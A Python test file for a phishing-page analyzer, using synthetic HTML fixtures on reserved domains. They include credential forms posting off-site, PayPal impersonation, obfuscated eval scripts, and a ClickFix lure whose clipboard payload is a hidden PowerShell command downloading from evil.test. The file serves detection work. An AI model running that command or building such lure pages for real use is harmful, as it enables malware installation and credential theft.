"""Tests for the HTML page analyzer (synthetic, inert fixtures on reserved domains)."""

from __future__ import annotations

import asyncio

import pytest

from uniphish.analyzers.page import PageAnalyzer
from uniphish.core.analyzer import REGISTRY, AnalysisContext, AnalysisOptions, AnalyzerResult
from uniphish.core.scoring import PRIOR_LOGIT, apply_contributions
from uniphish.core.types import Artifact, ArtifactKind, BrandMatch
from uniphish.page.favicon import favicon_mmh3


def run(html: str, url: str | None = None, ctx: AnalysisContext | None = None,
        **meta) -> AnalyzerResult:
    art = Artifact.from_page(html, url, **meta)
    return PageAnalyzer().analyze_sync(art, ctx or AnalysisContext(options=AnalysisOptions()))


def ids(res: AnalyzerResult) -> set[str]:
    return {s.id for s in res.signals}


def sig(res: AnalyzerResult, sid: str):
    return next(s for s in res.signals if s.id == sid)


def fused(res: AnalyzerResult) -> float:
    return PRIOR_LOGIT + apply_contributions(res.signals)


LOGIN_X = """<html><head><title>Sign in</title></head><body>
<form action="https://collector.example.net/post" method="post">
<input name="email"><input type="password" name="pass"></form></body></html>"""


def test_registered_and_declares_all_signals():
    assert REGISTRY["page"] is PageAnalyzer
    a = PageAnalyzer
    assert a.kinds == frozenset({ArtifactKind.PAGE}) and a.stage == 0 and a.blocking
    res = run(LOGIN_X, "https://login-portal.test/")
    for s in res.signals:
        assert s.id in a.signals
        assert len(a.signals[s.id]) <= 70
        assert len(s.title) <= 70


def test_cross_origin_credential_form():
    res = run(LOGIN_X, "https://login-portal.test/")
    s = sig(res, "page.form.password_cross_origin")
    assert s.weight == 4.0 and "T1056.003" in s.mitre and s.category == "page"
    assert "collector.example.net" in s.detail
    assert s.evidence["action_hosts"] == ["collector.example.net"]
    assert [c.origin for c in res.children] == ["page.form_action"]
    assert res.children[0].url == "https://collector.example.net/post"
    assert any(i.value == "collector.example.net" for i in res.indicators)
    assert res.meta["forms"] == 1 and res.meta["password_fields"] == 1
    assert res.meta["title"] == "Sign in"


def test_same_origin_login_is_low_risk():
    html = """<html><head><title>Welcome back</title></head><body>
    <form action="/session" method="post"><input name="user">
    <input type="password" name="pw"></form></body></html>"""
    res = run(html, "https://app.example.com/login")
    assert ids(res) == set()
    assert fused(res) == PRIOR_LOGIT
    assert res.children == []


def test_relative_action_resolves_same_origin_even_without_signals():
    res = run('<form action="login.php"><input type="password"></form>', "https://x.test/a/")
    assert "page.form.password_cross_origin" not in ids(res)


def test_data_uri_password_form():
    html = ('<form action="data:text/html;base64,PGh0bWw+" method="post">'
            '<input type="password" name="p"></form>')
    res = run(html, "https://login-portal.test/")
    s = sig(res, "page.form.password_data_uri")
    assert s.weight == 5.0
    assert "page.form.password_cross_origin" not in ids(res)
    assert res.children == []  # data: URIs are never emitted as child URLs


def test_offsite_js_submit_with_password():
    html = ('<form action="/x" onsubmit="fetch(\'https://c.example.net/\',{method:\'POST\'});'
            'return false"><input type="password" name="p"></form>')
    res = run(html, "https://login-portal.test/")
    assert sig(res, "page.form.password_offsite_js").weight == 3.0


def test_otp_form_offsite_without_password():
    html = ('<form action="https://relay.example.net/otp" method="post">'
            '<input name="otp_code"><button>Verify</button></form>')
    res = run(html, "https://login-portal.test/")
    s = sig(res, "page.form.otp_offsite")
    assert s.weight == 2.5 and "T1111" in s.mitre
    assert "otp_code" in s.evidence["fields"]


def test_otp_form_same_origin_ignored():
    res = run('<form action="/verify"><input name="otp"></form>', "https://login-portal.test/")
    assert "page.form.otp_offsite" not in ids(res)


def test_non_credential_offsite_form_ignored():
    res = run('<form action="https://news.example.net/s"><input name="q"></form>',
              "https://login-portal.test/")
    assert ids(res) == set()


def test_brand_content_mismatch_with_credential_form():
    html = """<html><head><title>PayPal - Log in to your account</title></head>
    <body><h1>PayPal</h1><form action="/go"><input type="password" name="p"></form></body></html>"""
    res = run(html, "https://secure-login.test/")
    s = sig(res, "brand.content_mismatch")
    assert s.weight == 3.5 and s.category == "brand" and s.confidence >= 0.9
    assert s.evidence["brand"] == "paypal"
    assert res.brand and res.brand.technique == "content" and not res.brand.official
    assert "paypal.com" in res.brand.legit_domains
    assert fused(res) > 0.5


def test_brand_mismatch_text_only_needs_login_context():
    blog = ("<html><head><title>Fees explained</title></head><body><p>PayPal charges fees "
            "for some payments, here is how they work.</p></body></html>")
    assert "brand.content_mismatch" not in ids(run(blog, "https://blog.test/"))
    login = ("<html><head><title>Account</title></head><body><h1>PayPal</h1>"
             "<p>Sign in to continue</p></body></html>")
    s = sig(run(login, "https://blog.test/"), "brand.content_mismatch")
    assert 0.5 <= s.confidence < 0.9


def test_title_only_brand_mention_has_low_confidence():
    html = "<html><head><title>PayPal fee calculator</title></head><body>Hello</body></html>"
    s = sig(run(html, "https://calc.test/"), "brand.content_mismatch")
    assert s.confidence < 0.5


def test_social_login_buttons_are_not_impersonation():
    html = ("<html><head><title>Acme login</title></head><body><h1>Acme</h1>"
            "<form action='/s'><input type='password' name='p'></form>"
            "<a>Sign in with Google</a><a>Continue with Facebook</a></body></html>")
    assert "brand.content_mismatch" not in ids(run(html, "https://acme.test/login"))


def test_og_site_name_counts_as_brand_reference():
    html = ('<html><head><title>Login</title><meta property="og:site_name" content="PayPal">'
            "</head><body><input type='password'></body></html>")
    assert sig(run(html, "https://x.test/"), "brand.content_mismatch").evidence["found_in"] \
        == "title"


def test_no_url_means_no_content_mismatch():
    html = ("<html><head><title>PayPal login</title></head>"
            "<body><input type='password'></body></html>")
    assert "brand.content_mismatch" not in ids(run(html, None))


def test_official_domain_gets_consistent_branding_credit():
    html = ("<html><head><title>PayPal - Log in</title></head><body>"
            "<form action='/signin'><input type='password'></form></body></html>")
    res = run(html, "https://www.paypal.com/signin")
    s = sig(res, "page.brand_consistent")
    assert s.weight == -1.0
    assert "brand.content_mismatch" not in ids(res)
    assert res.brand and res.brand.official
    assert fused(res) < PRIOR_LOGIT


def test_same_brand_cdn_form_target_not_cross_origin_alert():
    html = ("<html><head><title>PayPal</title></head><body>"
            "<form action='https://www.paypalobjects.com/x'><input type='password'></form>"
            "</body></html>")
    assert "page.form.password_cross_origin" not in ids(run(html, "https://www.paypal.com/"))


def test_lots_host_gets_no_consistent_branding_credit():
    html = ("<html><head><title>PayPal login</title></head>"
            "<body><input type='password'></body></html>")
    res = run(html, "https://phish-demo.pages.dev/")
    assert "page.brand_consistent" not in ids(res)
    assert sig(res, "brand.content_mismatch").evidence["lots_host"]


def test_top_site_mentioning_brand_is_exempt():
    html = ("<html><head><title>PayPal login help</title></head>"
            "<body><input type='password'></body></html>")
    assert "brand.content_mismatch" not in ids(run(html, "https://www.wikipedia.org/"))


def test_url_analyzer_agreement_boosts_confidence():
    html = "<html><head><title>PayPal</title></head><body>Hello</body></html>"
    base = sig(run(html, "https://pp-secure.test/"), "brand.content_mismatch").confidence
    ctx = AnalysisContext(options=AnalysisOptions())
    ctx.results["url"] = AnalyzerResult(brand=BrandMatch(
        brand="paypal", name="PayPal", technique="combosquat", confidence=0.8))
    s = sig(run(html, "https://pp-secure.test/", ctx), "brand.content_mismatch")
    assert s.confidence > base and s.evidence["url_analyzer_agrees"]


def test_favicon_mismatch_via_injected_table():
    icon = b"\x00synthetic-icon-bytes"
    table = {str(favicon_mmh3(icon)): "paypal"}
    res = run("<html><head><title>Hi</title></head><body></body></html>", "https://x.test/",
              favicon_bytes=icon, favicon_table=table)
    s = sig(res, "brand.favicon_mismatch")
    assert s.weight == 3.0 and s.evidence["brand"] == "paypal"
    ok = run("<html><body></body></html>", "https://www.paypal.com/", favicon_bytes=icon,
             favicon_table=table)
    assert "brand.favicon_mismatch" not in ids(ok)


def test_bad_favicon_meta_is_ignored():
    res = run("<html><body>x</body></html>", "https://x.test/", favicon_hash="nope")
    assert "brand.favicon_mismatch" not in ids(res)


CLICKFIX = """<html><head><title>Checking your browser</title></head><body>
<h1>Verify you are human</h1>
<p>Press Win + R, then press Ctrl + V and Enter to verify.</p>
<script>navigator.clipboard.writeText('powershell -w hidden -c "iwr hxxp://evil.test/a.ps1"');</script>
</body></html>"""


def test_clipboard_write_clickfix():
    res = run(CLICKFIX, "https://verify-check.test/")
    c = sig(res, "page.clipboard_write")
    assert c.weight == 2.5 and "T1204.004" in c.mitre and c.confidence == 1.0
    assert "page.clickfix_lure" in ids(res)
    assert fused(res) > 0


def test_clipboard_write_without_lure_is_low_confidence():
    html = ("<html><body><button onclick=\"navigator.clipboard.writeText('x')\">Copy</button>"
            "</body></html>")
    res = run(html, "https://docs.example.com/")
    c = sig(res, "page.clipboard_write")
    assert c.confidence <= 0.5
    assert "page.clickfix_lure" not in ids(res)


def test_obfuscated_script_signal():
    blob = "Zm9v" + "".join("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[
        (i * 37 + i // 7 * 13) % 64] for i in range(1800))
    html = (f"<html><body><input type='password'><script>var a='{blob}';"
            "eval(atob(a));eval(atob(a));eval(atob(a));</script></body></html>")
    res = run(html, "https://x.test/")
    s = sig(res, "page.obfuscated_script")
    assert s.weight == 2.0 and "T1027" in s.mitre and s.confidence == 1.0
    assert s.evidence["eval_like_calls"] >= 3


def test_plain_script_not_flagged():
    html = "<html><body><script>console.log('hello world');var x=1;</script></body></html>"
    assert ids(run(html, "https://x.test/")) == set()


def test_meta_refresh_offsite_creates_child():
    html = ('<html><head><meta http-equiv="refresh" content="0;url=https://next.example.net/a">'
            "</head><body>Redirecting</body></html>")
    res = run(html, "https://hop.test/")
    assert sig(res, "page.meta_refresh_offsite").weight == 1.5
    assert [(c.origin, c.url) for c in res.children] == [
        ("page.refresh", "https://next.example.net/a")]


def test_meta_refresh_same_site_ignored():
    html = '<meta http-equiv="refresh" content="0;url=/next">'
    assert "page.meta_refresh_offsite" not in ids(run(html, "https://hop.test/"))


def test_hidden_iframe_offsite():
    html = ('<body><iframe src="https://frame.example.net/x" style="display:none"></iframe>'
            '<iframe src="https://visible.example.net/"></iframe></body>')
    res = run(html, "https://hop.test/")
    s = sig(res, "page.iframe_hidden_offsite")
    assert s.weight == 2.0 and s.evidence["hosts"] == ["frame.example.net"]
    same = '<iframe src="https://sub.hop.test/x" style="display:none"></iframe>'
    assert "page.iframe_hidden_offsite" not in ids(run(same, "https://hop.test/"))


def test_script_children_only_for_interesting_hosts_and_capped():
    scripts = "".join(f'<script src="https://cdn{i}.workers.dev/s.js"></script>' for i in range(30))
    scripts += '<script src="https://cdnjs.cloudflare.com/ajax/x.js"></script>'
    res = run(f"<html><body>{scripts}</body></html>", "https://hop.test/")
    assert 0 < len(res.children) <= 8
    assert all(c.origin == "page.script" for c in res.children)
    assert not any("cdnjs" in (c.url or "") for c in res.children)


def test_children_deduplicated():
    html = ('<form action="https://c.example.net/p"><input type="password"></form>'
            '<form action="https://c.example.net/p"><input type="password"></form>')
    res = run(html, "https://x.test/")
    assert len(res.children) == 1


def test_empty_and_garbage_inputs_never_raise():
    assert run("", "https://x.test/").signals == []
    assert run("<<<>>><form", None).signals == []
    big = "<div>" * 5000 + "PayPal login" + "</div>" * 5000
    run(big, "https://x.test/")


def test_engine_integration():
    from uniphish.core.engine import Engine

    verdict = asyncio.run(Engine().analyze_page(LOGIN_X, "https://login-portal.test/"))
    assert any(s.id == "page.form.password_cross_origin" for s in verdict.signals)
    assert verdict.meta.get("forms") == 1


@pytest.mark.parametrize("html", [
    "<form action='https://a.example.net'><input type=password></form>" * 3,
])
def test_multiple_forms_single_signal(html):
    res = run(html, "https://x.test/")
    assert [s.id for s in res.signals].count("page.form.password_cross_origin") == 1
